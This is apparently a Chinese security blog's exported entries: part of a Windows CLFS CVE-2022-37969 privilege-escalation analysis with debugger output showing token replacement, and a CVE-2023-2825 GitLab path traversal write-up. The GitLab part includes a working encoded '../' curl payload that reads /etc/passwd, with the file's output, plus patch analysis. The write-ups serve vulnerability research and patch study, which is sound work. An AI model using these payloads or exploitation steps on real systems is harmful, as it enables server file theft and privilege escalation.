执行到nt!SeSetAccessStateGenericMapping函数时，rdx指向内存0xFFFFFFFF，该内存存储了system token的地址，将其写入到rax+8指向的地址中，此处为自身token地址，也就是将system token地址写入到了自身token地址中，即把自身token 替换成了system token达成提权。\nsystem权限token 1: kd\u0026gt; dp rdx L6 00000000`ffffffff ffff8e86`03e616fc 00000000`00000000 00000001`0000000f 00000000`00000000 00000000`00000000 00000001`0000001f 00000000`00000000 00000000`00000000 1: kd\u0026gt; !process 4 1 Searching for Process with Cid == 4 PROCESS ffffb1838ce87180 SessionId: none Cid: 0004 Peb: 00000000 ParentCid: 0000 DirBase: 001ad000 ObjectTable: ffff8e8603e57d40 HandleCount: 2731. Image: System VadRoot ffffb1838ce94920 Vads 6 Clone 0 Private 22. Modified 4650. Locked 0. DeviceMap ffff8e8603e35ae0 Token ffff8e8603e616f0 ElapsedTime 00:58:07.536 UserTime 00:00:00.000 KernelTime 00:00:03.093 QuotaPoolUsage[PagedPool] 0 QuotaPoolUsage[NonPagedPool] 272 Working Set Sizes (now,min,max) (49, 50, 450) (196KB, 200KB, 1800KB) PeakWorkingSetSize 216 VirtualSize 3 Mb PeakVirtualSize 14 Mb PageFaultCount 2325 MemoryPriority BACKGROUND BasePriority 8 CommitCharge 49 当前权限token 1: kd\u0026gt; !process 0x10cc 1 Searching for Process with Cid == 10cc PROCESS ffffb18391fe7080 SessionId: 1 Cid: 10cc Peb: f894963000 ParentCid: 0294 DirBase: a8104000 ObjectTable: ffff8e860b632980 HandleCount: 92. Image: exp.exe VadRoot ffffb18392993580 Vads 57 Clone 0 Private 4686. Modified 1209. Locked 0. DeviceMap ffff8e8608a9b1d0 Token ffff8e860bc6f770 ElapsedTime 00:54:10.168 UserTime 00:00:00.000 KernelTime 00:00:00.000 QuotaPoolUsage[PagedPool] 123368 QuotaPoolUsage[NonPagedPool] 8096 Working Set Sizes (now,min,max) (5602, 50, 345) (22408KB, 200KB, 1380KB) PeakWorkingSetSize 5529 VirtualSize 4210 Mb PeakVirtualSize 4210 Mb PageFaultCount 8565 MemoryPriority BACKGROUND BasePriority 8 CommitCharge 6285 1: kd\u0026gt; dp rax+8 L2 ffffb183`91fe7538 ffff8e86`0bc6f774 00000000`00000000 继续执行，当前进程的Token已经被替换为系统Token\n1: kd\u0026gt; nt!SeSetAccessStateGenericMapping+0xc: fffff807`15ff2dac c3 ret 1: kd\u0026gt; dp ffffb183`91fe7080+0x4b8 L6 ffffb183`91fe7538 ffff8e86`03e616fc 00000000`00000000 ffffb183`91fe7548 00000000`00000000 00000000`00000000 ffffb183`91fe7558 00000000`00000000 00000000`00000000 1: kd\u0026gt; !process 0x10cc 1 Searching for Process with Cid == 10cc PROCESS ffffb18391fe7080 SessionId: 1 Cid: 10cc Peb: f894963000 ParentCid: 0294 DirBase: a8104000 ObjectTable: ffff8e860b632980 HandleCount: 92. Image: exp.exe VadRoot ffffb18392993580 Vads 57 Clone 0 Private 4686. Modified 1209. Locked 0. DeviceMap ffff8e8608a9b1d0 Token ffff8e8603e616f0 ElapsedTime 01:06:41.537 UserTime 00:00:00.000 KernelTime 00:00:00.000 QuotaPoolUsage[PagedPool] 123368 QuotaPoolUsage[NonPagedPool] 8096 Working Set Sizes (now,min,max) (5602, 50, 345) (22408KB, 200KB, 1380KB) PeakWorkingSetSize 5529 VirtualSize 4210 Mb PeakVirtualSize 4210 Mb PageFaultCount 8565 MemoryPriority BACKGROUND BasePriority 8 CommitCharge 6285 1: kd\u0026gt; !token ffff8e8603e616f0 _TOKEN 0xffff8e8603e616f0 TS Session ID: 0 User: S-1-5-18 User Groups: 00 S-1-5-32-544 Attributes - Default Enabled Owner 01 S-1-1-0 Attributes - Mandatory Default Enabled 02 S-1-5-11 Attributes - Mandatory Default Enabled 03 S-1-16-16384 Attributes - GroupIntegrity GroupIntegrityEnabled Primary Group: S-1-5-18 Privs: 02 0x000000002 SeCreateTokenPrivilege Attributes - 03 0x000000003 SeAssignPrimaryTokenPrivilege Attributes - 04 0x000000004 SeLockMemoryPrivilege Attributes - Enabled Default 05 0x000000005 SeIncreaseQuotaPrivilege Attributes - 07 0x000000007 SeTcbPrivilege Attributes - Enabled Default 08 0x000000008 SeSecurityPrivilege Attributes - 09 0x000000009 SeTakeOwnershipPrivilege Attributes - 10 0x00000000a SeLoadDriverPrivilege Attributes - 11 0x00000000b SeSystemProfilePrivilege Attributes - Enabled Default 12 0x00000000c SeSystemtimePrivilege Attributes - 13 0x00000000d SeProfileSingleProcessPrivilege Attributes - Enabled Default 14 0x00000000e SeIncreaseBasePriorityPrivilege Attributes - Enabled Default 15 0x00000000f SeCreatePagefilePrivilege Attributes - Enabled Default 16 0x000000010 SeCreatePermanentPrivilege Attributes - Enabled Default 17 0x000000011 SeBackupPrivilege Attributes - 18 0x000000012 SeRestorePrivilege Attributes - 19 0x000000013 SeShutdownPrivilege Attributes - 20 0x000000014 SeDebugPrivilege Attributes - Enabled Default 21 0x000000015 SeAuditPrivilege Attributes - Enabled Default 22 0x000000016 SeSystemEnvironmentPrivilege Attributes - 23 0x000000017 SeChangeNotifyPrivilege Attributes - Enabled Default 25 0x000000019 SeUndockPrivilege Attributes - 28 0x00000001c SeManageVolumePrivilege Attributes - 29 0x00000001d SeImpersonatePrivilege Attributes - Enabled Default 30 0x00000001e SeCreateGlobalPrivilege Attributes - Enabled Default 31 0x00000001f SeTrustedCredManAccessPrivilege Attributes - 32 0x000000020 SeRelabelPrivilege Attributes - 33 0x000000021 SeIncreaseWorkingSetPrivilege Attributes - Enabled Default 34 0x000000022 SeTimeZonePrivilege Attributes - Enabled Default 35 0x000000023 SeCreateSymbolicLinkPrivilege Attributes - Enabled Default 36 0x000000024 SeDelegateSessionUserImpersonatePrivilege Attributes - Enabled Default Authentication ID: (0,3e7) Impersonation Level: Anonymous TokenType: Primary Source: *SYSTEM* TokenFlags: 0x2000 ( Token in use ) Token ID: 3eb ParentToken ID: 0 Modified ID: (0, 3ec) RestrictedSidCount: 0 RestrictedSids: 0x0000000000000000 OriginatingLogonSession: 0 PackageSid: (null) CapabilityCount: 0 Capabilities: 0x0000000000000000 LowboxNumberEntry: 0x0000000000000000 Security Attributes: Invalid AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION with no claims Process Token TrustLevelSid: S-1-19-1024-8192 替换完Token之后当前进程权限已经变为system权限\n补丁分析 WIN10\n使用Bindiff查看可知补丁主要修改了三个函数\n在CClfsBaseFilePersisted::LoadContainerQ增加了对SignatureOffset的检查，使其不能超过BASE_RECORD大小，增加了对cbSymbolZone 的检查\n__int64 __fastcall CClfsBaseFilePersisted::LoadContainerQ( CClfsBaseFilePersisted *this, unsigned int *const a2, int a3, unsigned __int8 a4, char a5, union _CLS_LSN a6, unsigned int *a7, unsigned int *a8, unsigned __int64 *a9) { ..... while ( v16 ); v74 = ExAcquireResourceExclusiveLite(*((PERESOURCE *)this + 4), 1u); BaseLogRecord = (struct _CLFS_BASE_RECORD_HEADER *)CClfsBaseFile::GetBaseLogRecord(this); if ( BaseLogRecord ) { if ( (int)Feature_Servicing_41154973__private_IsEnabled() ) { **if ( *(_DWORD *)(v10 + 0x68) \u0026gt; *(unsigned __int16 *)(v10 + 4) \u0026lt;\u0026lt; 9 )// SignatureOffset { v20 = -1072037875; v73 = -1072037875; goto LABEL_146; } if ( (int)ULongLongAdd((unsigned __int64)BaseLogRecord + 0x1338, *((unsigned int *)BaseLogRecord + 0x4CA), \u0026amp;v91) \u0026lt; 0 || (int)ULongLongAdd(v10, v21, \u0026amp;v90) \u0026lt; 0// 将BASE_RECORD_HEADER和cbSymbolZone相加 || v91 \u0026gt; v90 )** { v20 = -1072037875; v73 = -1072037875; goto LABEL_146; } } Src = (char *)BaseLogRecord + 808; v79 = CClfsBaseFile::ContainerCount(this); v22 = 0; while ( v11 \u0026lt; 0x400 ) { v17 = (CClfsContainer *)v11; 在CClfsBaseFile::GetSymbol中增加了对Client Context 的检查，验证是否是正确的Client Context\n__int64 __fastcall CClfsBaseFile::GetSymbol( PERESOURCE *this, unsigned int a2, char a3, struct _CLFS_CLIENT_CONTEXT **a4) { ... if ( !v11 ) goto LABEL_12; if ( *(v11 - 3) != a2 ) { v8 = -1073741816; LABEL_13: v16 = v8; goto LABEL_14; } v12 = ClfsQuadAlign(0x88u); **if ( *((_DWORD *)v13 - 4) != (unsigned __int64)(v15 + v12)// 验证Client Context上下文 || *(_DWORD *)v13 != -1040322553 || *((_DWORD *)v13 + 1) != v14 || *((_BYTE *)v13 + 8) != a3** ) { LABEL_12: v8 = -1072037875; goto LABEL_13; } *a4 = v13; WIN11\nwin11上补丁主要新增了以下几个函数\nCClfsBaseFile::AllocOffsetNode(_RTL_AVL_TABLE *,ulong) CClfsBaseFile::CompareGenericoffsets(_RTL_AVL_TABLE *,void *,void *) CClfsBaseFile::ValidateCheckifWithinSymbolZone(ulong,_CLFS_BASE_RECORD_HEADER *) CClfsBaseFile::ValidateClientContextOffsets(_CLFS_VALIDATE_OFFSET_TABLE *,_CLFS_BASE_RECORD_HEADER * const) CClfsBaseFile::ValidateClientSymTblOffsets(_CLFS_VALIDATE_OFFSET_TABLE *,_CLFS_BASE_RECORD_HEADER * const) CClfsBaseFile::ValidateContainerSymTblOffsets(_CLFS_VALIDATE_OFFSET_TABLE *,_CLFS_BASE_RECORD_HEADER * const) CClfsBaseFile::ValidateProcessQNode(_CLFS_VALIDATE_OFFSET_TABLE *,_CLFS_BASE_RECORD_HEADER * const,ulong,ulong \u0026amp;,ulong \u0026amp;) 从CClfsBaseFilePersisted::LoadContainerQ 函数开始调用堆栈为：\nCClfsBaseFilePersisted::LoadContainerQ→CClfsBaseFile::ValidateOffsets→CClfsBaseFile::ValidateClientContextOffsets→CClfsBaseFile::ValidateCheckifWithinSymbolZone\n函数CClfsBaseFile::ValidateOffsets 伪代码如下：\n__int64 __fastcall CClfsBaseFile::ValidateOffsets(CClfsBaseFile *this, struct _CLFS_BASE_RECORD_HEADER *const a2) { char v4; // r13 unsigned __int64 v5; // rbx struct _RTL_AVL_TABLE *TableContext; // rax struct _CLFS_VALIDATE_OFFSET_TABLE *v7; // rdi ...... v4 = 0; v5 = *(_QWORD *)(*((_QWORD *)this + 6) + 48i64); TableContext = (struct _RTL_AVL_TABLE *)ExAllocatePoolWithTag(PagedPool, 0x68ui64, 0x73666C43u); v7 = (struct _CLFS_VALIDATE_OFFSET_TABLE *)TableContext; if ( !TableContext ) return 3221225626i64; RtlInitializeGenericTableAvl( TableContext, CClfsBaseFile::CompareGenericoffsets, CClfsBaseFile::AllocOffsetNode, CClfsLogFcbPhysical::ReleaseLsnMap, TableContext); v9 = *(unsigned int *)(v5 + 104); if ( (unsigned int)v9 \u0026gt; *(unsigned __int16 *)(v5 + 4) \u0026lt;\u0026lt; 9 ) goto LABEL_25; v10 = (char *)a2 + *((unsigned int *)a2 + 1226) + 4920; if ( v10 \u0026lt; (char *)a2 + 4920 || v5 + v9 \u0026lt; v5 || (unsigned __int64)v10 \u0026gt; v5 + v9 ) goto LABEL_25; v11 = CClfsBaseFile::ValidateContainerContextOffsets(this, v7, a2); **if ( v11 \u0026lt; 0 || (v11 = CClfsBaseFile::ValidateClientContextOffsets(this, (struct _RTL_AVL_TABLE *)v7, a2), v11 \u0026lt; 0) || (v11 = CClfsBaseFile::ValidateContainerSymTblOffsets(this, v7, a2), v11 \u0026lt; 0) || (v11 = CClfsBaseFile::ValidateClientSymTblOffsets(this, v7, a2), v11 \u0026lt; 0) )** { LABEL_26: ..... LABEL_35: ExFreePoolWithTag(v7, 0); return (unsigned int)v11; } 该代码中通过调用CClfsBaseFile::ValidateClientContextOffsets CClfsBaseFile::ValidateClientSymTblOffsets CClfsBaseFile::ValidateContainerSymTblOffsets检查Client Context Offset、Container Sybbol Table等偏移是否合法。\nCClfsBaseFile::ValidateClientContextOffsets伪代码如下，该代码循环遍历检查每个Container并调用CClfsBaseFile::ValidateCheckifWithinSymbolZone检查cbSymbolZone是否合法。\n__int64 __fastcall CClfsBaseFile::ValidateClientContextOffsets( CClfsBaseFile *this, struct _RTL_AVL_TABLE *a2, struct _CLFS_BASE_RECORD_HEADER *const a3) { int Symbol; // ebx int v4; // r14d __int64 v5; // rdi unsigned int v8; // esi CClfsBaseFile *v9; // rcx struct _CLFS_BASE_RECORD_HEADER *v10; // r8 ..... do { v8 = *((_DWORD *)a3 + v5 + 78); if ( v8 - 1 \u0026lt;= 0xFFFFFFFD ) { ++v4; Symbol = CClfsBaseFile::ValidateCheckifWithinSymbolZone(this, v8 + 135, a3); if ( Symbol \u0026lt; 0 ) goto LABEL_15; Symbol = CClfsBaseFile::ValidateCheckifWithinSymbolZone(v9, v8 - 48, v10); if ( Symbol \u0026lt; 0 ) goto LABEL_15; v11 = CClfsBaseFile::OffsetToAddr(this, v8); if ( !v11 ) goto LABEL_15; v12 = *(v11 - 3); if ( v12 != v8 ) goto LABEL_15; if ( *(v11 - 4) != v12 + 136 ) goto LABEL_15; v19 = 0i64; Symbol = CClfsBaseFile::GetSymbol(this, v8, v5, \u0026amp;v19); if ( Symbol \u0026lt; 0 ) goto LABEL_15; if ( *((unsigned __int8 *)v19 + 8) != (_DWORD)v5 ) goto LABEL_15; if ( *(_DWORD *)v19 != -1040322553 ) goto LABEL_15; Buffer = *((_DWORD *)a3 + v5 + 78) - 48; inserted = RtlInsertElementGenericTableAvl(a2, \u0026amp;Buffer, 8u, \u0026amp;NewElement); if ( !NewElement || !inserted ) goto LABEL_15; } v5 = (unsigned int)(v5 + 1); } while ( (unsigned int)v5 \u0026lt; 0x7C ); if ( v4 != CClfsBaseFile::ClientCount(this) ) { ...... return (unsigned int)Symbol; } CClfsBaseFile::ValidateCheckifWithinSymbolZone函数检查cbSymbolZone偏移是否处于政策范围内（处于BASE_RECORD_HEADER和BASE_RECORD之间）\n__int64 __fastcall CClfsBaseFile::ValidateCheckifWithinSymbolZone( CClfsBaseFile *this, unsigned int a2, struct _CLFS_BASE_RECORD_HEADER *a3) { if ( a2 \u0026lt; 0x1338 || a2 - 4920 \u0026gt; *((_DWORD *)a3 + 1226) ) return 3222929421i64; else return 0i64; } 小结 这次漏洞的造成原因是自身的SignatureOffset和自身的Signatures相交，导致攻击者可以利用循环写入Signatures的时候覆盖SignatureOffset，从而绕过ResetLog中的边界检查，同时未检查BASE_RECORD_HEADER + cbSymbolZone是否位于当前的BASE_RECORD中，导致攻击者可以利用漏洞通过memset函数对任意地址的一定大小的内存进行清零。\n在实际利用中通过清零pContainer指针的高五位同时在用户层通过堆布局伪造CClfsContainer对象，在解引用对象指针时获取到执行代码的时机。通过结合Pipe对象和内核的两个函数成功获得任意读和任意写，从而成功将当前进程的Token替换成系统进程的token，达成提权。利用过程\n在漏洞补丁中增加了对cbSymbolZone和Client Context的检查从而在漏洞利用初期阻断。\n总的来说该漏洞形成原因是代码调用某些函数时未检查边界且该边界用户可控或间接可控。\n参考链接\nhttps://github.com/fortra/CVE-2022-37969\nhttps://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2022-37969-part2-exploit-analysis\nhttps://mp.weixin.qq.com/s/GMzbavzltM756Fb8lw6h_A\nhttps://bbs.kanxue.com/thread-275566.htm#msg_header_h3_0\nhttps://www.geoffchappell.com/\nhttps://github.com/ionescu007/clfs-docs\nhttps://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf\nhttps://www.52pojie.cn/thread-1817452-1-1.html\nCreated at 2023-05-26T10:56:00+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/","title":"CVE-2023-2825 Gitlab 路径穿越漏洞分析","tags":["漏洞分析"],"description":"","content":"基本信息 在GitLab 中，当一个附件存在于一个项目中，并且该项目在嵌套了至少五层的组内，攻击者才可以利用这个漏洞进行目录穿越，读取服务器上的文件。\n影响版本 GitLab 16.0.0\n环境搭建 用docker起环境\ndocker pull gitlab/gitlab-ce:16.0.0-ce.0 docker run -d -p 443:443 -p 80:80 -p 222:22 --name gitlab --restart always -v /home/gitlab/config:/etc/gitlab -v /home/gitlab/logs:/var/log/gitlab -v /home/gitlab/data:/var/opt/gitlab gitlab/gitlab-ce:16.0.0-ce.0 技术分析\u0026amp;调试 一开始以为是普通的目录穿越，先diff看怎么修的，注意到16.0.1新增了spec\\support\\shared_examples\\requests\\uploads_actions_shared_examples.rb 文件。\n根据该文件内容判断应该是这个漏洞的单元测试文件，没学过ruby，先把这段代码扔给ChatGPT看看\n# frozen_string_literal: true RSpec.shared_examples \u0026#39;uploads actions\u0026#39; do describe \u0026#34;GET #show\u0026#34; do context \u0026#39;with file traversal in filename parameter\u0026#39; do # Uploads in tests are stored in directories like: # tmp/tests/public/uploads/@hashed/AB/CD/ABCD/SECRET let(:filename) { \u0026#34;../../../../../../../../../Gemfile.lock\u0026#34; } let(:escaped_filename) { CGI.escape filename } it \u0026#39;responds with status 400\u0026#39; do # Check files do indeed exists upload_absolute_path = Pathname(upload.absolute_path) expect(upload_absolute_path).to be_exist attacked_file_path = upload_absolute_path.dirname.join(filename) expect(attacked_file_path).to be_exist # Need to escape, otherwise we get `ActionController::UrlGenerationError Exception: No route matches` get show_path.sub(File.basename(upload.path), escaped_filename) expect(response).to have_gitlab_http_status(:bad_request) end end end end ChatGPT回答：\n这段Ruby代码定义了一个RSpec共享示例，名为“uploads actions”，它包含一个测试用例。这个测试用例测试了在文件名参数中发生文件遍历攻击时服务器的响应行为。 在测试用例中，首先定义了两个变量：filename和escaped_filename。filename变量是一个字符串，它代表将被攻击的文件名。escaped_filename变量是对filename进行URL编码后的结果，这是为了避免请求URL中使用不安全的字符可能会导致意外的结果。 然后，该测试用例检查上传的文件是否存在，之后构造一个恶意URL请求来执行文件遍历攻击，请求一个非法文件。具体而言，它使用Pathname类来获取上传文件的绝对路径，然后使用File.basename和String#sub方法来构造恶意URL请求。最后，使用RSpec的expect语句来检查服务器的响应状态码是否为400（bad_request）。 总之，这个RSpec共享示例测试了服务器是否能够防止文件遍历攻击，并正确地处理恶意请求。 根据有限的知识结合ChatGPT回答，可以知道这段代码首先定义了目录穿越的payload：../../../../../../../../../Gemfile.lock 而后将其进行url编码并赋值给escaped_filename。\n之后将上传目录的路径和这个payload拼接并判断这个路径是否存在。之后通过String.sub函数将上传路径的文件名替换成了escaped_filename，并用RSpec 框架的get函数发起请求。\n结合该单元测试的注释，可以知道，大概payload如下\n/url/to/upload/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2FGemfile%2Elock # Uploads in tests are stored in directories like: # tmp/tests/public/uploads/@hashed/AB/CD/ABCD/SECRET 在通过官方文档知道如何通过API上传附件\ncurl --request POST --header \u0026#34;PRIVATE-TOKEN: \u0026lt;your_access_token\u0026gt;\u0026#34; \\ --form \u0026#34;file=@dk.png\u0026#34; \u0026#34;https://gitlab.example.com/api/v4/projects/5/uploads\u0026#34; https://github.com/gitlabhq/gitlabhq/blob/master/doc/api/projects.md#upload-a-file\n这里先用Administrator上传一个附件看看（已提前建好相应的组和项目）\n$ curl --request POST --header \u0026#34;PRIVATE-TOKEN: glpat-Py3rEGA_SPngPn-2LzsR\u0026#34; --form \u0026#34;file=@3.txt\u0026#34; \u0026#34;http://192.168.59.197/api/v4/projects/g1%2Fg2%2Fg3%2Fg4%2Fg5%2Fg6%2Fg7%2Fg8%2Fg9%2Fp4/uploads\u0026#34; {\u0026#34;alt\u0026#34;:\u0026#34;3.txt\u0026#34;,\u0026#34;url\u0026#34;:\u0026#34;/uploads/3fc9a510049cd6bbee4507d21164020f/3.txt\u0026#34;,\u0026#34;full_pat h\u0026#34;:\u0026#34;/g1/g2/g3/g4/g5/g6/g7/g8/g9/p4/uploads/3fc9a510049cd6bbee4507d21164020f/3.tx t\u0026#34;,\u0026#34;markdown\u0026#34;:\u0026#34;[3.txt](/uploads/3fc9a510049cd6bbee4507d21164020f/3.txt)\u0026#34;} 可以看到已经返回了一个url，不难看出和单元测试里面的注释的路径长得很像，这里用自己的payload替换3.txt\n$ curl http://192.168.59.197/g1/g2/g3/g4/g5/g6/g7/g8/g9/p4/uploads/3fc9a510049cd6bbee4507d21164020f/%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2Fetc%2fpasswd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologi n nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin sshd:x:101:65534::/run/sshd:/usr/sbin/nologin git:x:998:998::/var/opt/gitlab:/bin/sh gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh registry:x:993:993::/var/opt/gitlab/registry:/bin/sh gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh 分析\n到现在有两个问题\n为什么要求payload需要经过url编码 为什么要12个穿越符才能到根目录 在哪个代码触发的漏洞 首先是第一个问题，GitLab架构为nginx ↔Workhorse↔puma，起初以为将目录穿越进行url编码是绕过nginx解析，举个例子，当访问/1/2/3/4/5/6/../../../index.php时nginx实际会访问/1/2/3/index.php，即会进行拼接然后访问，所以一开始判断的是将payload进行url编码绕过这个过程，而后和其他师傅讨论才发现，虽然将payload进行编码但nginx会将url里面url编码的部分进行解码然后拼接，所以url编码不是为了绕过nginx解析。在前面使用api上传文件时，文档特别强调了上传目标路径需要进行url编码，这里推测应该是GitLab内会进行url解码在进行处理。\n第二个问题为什么需要12个穿越符，经过测试发现文件实际上传在/var/opt/gitlab/gitlab-rails/uploads/@hashed 目录下，但在代码中使用的是/opt/gitlab/embedded/service/gitlab-rails/public/uploads/@hashed/ 其中uploads软连接到了/var/opt/gitlab/gitlab-rails/uploads目录，在上传一个文件后，文件路径为/opt/gitlab/embedded/service/gitlab-rails/public/uploads/@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a/34c2b7fc66dcfbfe0b65513260ad0510/3.txt 不难看出共有12层目录所以需要12个穿越符，在触发漏洞时url为/path/to/group/project/uploads/@hashed，结合绕过nginx解析，所以至少需要9个组才能有足够的嵌套层数绕过nginx的url解析。\n第三个问题，回到补丁对比，补丁主要在以下两个文件添加了防护目录穿越的代码，在show方法处对filename进行url解码而后调用 Gitlab::Utils.check_path_traversal!(params[:filename]) 检查url解码后的参数是否存在目录穿越。\napp\\uploaders\\object_storage.rb def retrieve_from_store!(identifier) Gitlab::Utils.check_path_traversal!(identifier) # We need to force assign the value of @filename so that we will still # get the original_filename in cases wherein the file points to a random generated # path format. This happens for direct uploaded files to final location. # # If we don\u0026#39;t set @filename value here, the result of uploader.filename (see ObjectStorage#filename) will result # to the value of uploader.file.filename which will then contain the random generated path. # The `identifier` variable contains the value of the `file` column which is the original_filename. # # In cases wherein we are not uploading to final location, it is still fine to set the # @filename with the `identifier` value because it still contains the original filename from the `file` column, # which is what we want in either case. @filename = identifier # rubocop: disable Gitlab/ModuleWithInstanceVariables super end private app\\controllers\\concerns\\uploads_actions.rb def show Gitlab::Utils.check_path_traversal!(params[:filename]) return render_404 unless uploader\u0026amp;.exists? ttl, directives = *cache_settings ttl ||= 0 directives ||= { private: true, must_revalidate: true } expires_in ttl, directives file_uploader = [uploader, *uploader.versions.values].find do |version| version.filename == params[:filename] end return render_404 unless file_uploader workhorse_set_content_type! send_upload(file_uploader, attachment: file_uploader.filename, disposition: content_disposition) end 再来看Gitlab::Utils.check_path_traversal函数，其定义在lib\\gitlab\\utils.rb\ndef check_path_traversal!(path) return unless path path = path.to_s if path.is_a?(Gitlab::HashedPath) raise PathTraversalAttackError, \u0026#39;Invalid path\u0026#39; unless path.is_a?(String) path = decode_path(path) path_regex = %r{(\\A(\\.{1,2})\\z|\\A\\.\\.[/\\\\]|[/\\\\]\\.\\.\\z|[/\\\\]\\.\\.[/\\\\]|\\n)} if path.match?(path_regex) logger.warn(message: \u0026#34;Potential path traversal attempt detected\u0026#34;, path: \u0026#34;#{path}\u0026#34;) raise PathTraversalAttackError, \u0026#39;Invalid path\u0026#39; end path end 这个函数接收一个路径，而后用正则表达式进行匹配，如果匹配到了则抛出PathTraversalAttackError 错误，把这段正则表达式给ChatGPT，给出了如下解释，所以代码调用这个函数可以检查是否存在恶意的目录穿越。\n这个正则表达式也是用来匹配文件路径字符串中的相对路径（如\u0026#34;./\u0026#34;、\u0026#34;../\u0026#34;等）的，它的含义与前一个问题中的正则表达式非常相似，只是使用了不同的语法来表示相同的含义。具体来说，这个正则表达式的含义如下： json \\A 匹配字符串的开头 (.{1,2}) 匹配一个或两个任意字符，并将其作为一个分组 \\z 匹配字符串的结尾 | 或 \\A..\\[/\\\\] 匹配以\u0026#34;../\u0026#34;开头的字符串 | 或 [/\\\\]..\\z 匹配以\u0026#34;/..\u0026#34;结尾的字符串 | 或 [/\\\\]..\\[/\\\\] 匹配\u0026#34;/../\u0026#34;或\u0026#34;\\..\\\u0026#34;这样以\u0026#34;/\u0026#34;或\u0026#34;\\\u0026#34;开头且以\u0026#34;/\u0026#34;或\u0026#34;\\\u0026#34;结尾的字符串 | 或 \\n 匹配换行符 ) 分组结束 其中，\\A、\\z和\\n分别代表字符串的开头、结尾和换行符，|表示或的关系，[/\\\\]用来匹配\u0026#34;\u0026#34;或\u0026#34;/\u0026#34;这两种目录分隔符，因为在不同的操作系统中，目录分隔符是不同的。 这个正则表达式的作用是匹配一个相对路径字符串，用来检测是否存在不合法的相对路径，例如路径中包含超出根目录的\u0026#34;../\u0026#34;或者\u0026#34;..\u0026#34;这样的字符串，或者以\u0026#34;../\u0026#34;开头或以\u0026#34;/..\u0026#34;结尾。如果匹配成功，说明该路径存在不合法的相对路径，需要进行处理或报错。 补丁还以下路径新增了文件，不难看出是在定义了module和upload对象，而后定义了一个字符串show_path并把它传给了config/routes/uploads.rb执行。\nspec\\requests\\uploads_controller_spec.rb # frozen_string_literal: true require \u0026#39;spec_helper\u0026#39; RSpec.describe UploadsController, feature_category: :shared do include WorkhorseHelpers it_behaves_like \u0026#39;uploads actions\u0026#39; do let_it_be(:model) { create(:personal_snippet, :public) } let_it_be(:upload) { create(:upload, :personal_snippet_upload, :with_file, model: model) } # See config/routes/uploads.rb let(:show_path) do \u0026#34;/uploads/-/system/#{model.model_name.singular}/#{model.to_param}/#{upload.secret}/#{File.basename(upload.path)}\u0026#34; end end end 在config/routes/uploads.rb中，定义了路由匹配规则用来处理上传文件和显示文件的请求，结合spec\\requests\\uploads_controller_spec.rb的内容可以知道应该是在处理路由get '-/system/:model/:id/:secret/:filename'时，将文件名传给uploads模块的show方法触发漏洞。\nconfig/routes/uploads.rb # frozen_string_literal: true scope path: :uploads do # Note attachments and User/Group/Project/Topic avatars get \u0026#34;-/system/:model/:mounted_as/:id/:filename\u0026#34;, to: \u0026#34;uploads#show\u0026#34;, constraints: { model: %r{note|user|group|project|projects\\/topic|achievements\\/achievement}, mounted_as: /avatar|attachment/, filename: %r{[^/]+} } # show uploads for models, snippets (notes) available for now get \u0026#39;-/system/:model/:id/:secret/:filename\u0026#39;, to: \u0026#39;uploads#show\u0026#39;, constraints: { model: /personal_snippet|user/, id: /\\d+/, filename: %r{[^/]+} } # show temporary uploads get \u0026#39;-/system/temp/:secret/:filename\u0026#39;, to: \u0026#39;uploads#show\u0026#39;, constraints: { filename: %r{[^/]+} } # Appearance get \u0026#34;-/system/:model/:mounted_as/:id/:filename\u0026#34;, to: \u0026#34;uploads#show\u0026#34;, constraints: { model: /appearance/, mounted_as: /logo|header_logo|pwa_icon|favicon/, filename: /.+/ }, as: \u0026#39;appearance_upload\u0026#39; # create uploads for models, snippets (notes) available for now post \u0026#39;:model\u0026#39;, to: \u0026#39;uploads#create\u0026#39;, constraints: { model: /personal_snippet|user/, id: /\\d+/ }, as: \u0026#39;upload\u0026#39; post \u0026#39;:model/authorize\u0026#39;, to: \u0026#39;uploads#authorize\u0026#39;, constraints: { model: /personal_snippet|user/ } # Alert Metric Images get \u0026#34;-/system/:model/:mounted_as/:id/:filename\u0026#34;, to: \u0026#34;uploads#show\u0026#34;, constraints: { model: /alert_management_metric_image/, mounted_as: /file/, filename: %r{[^/]+} }, as: 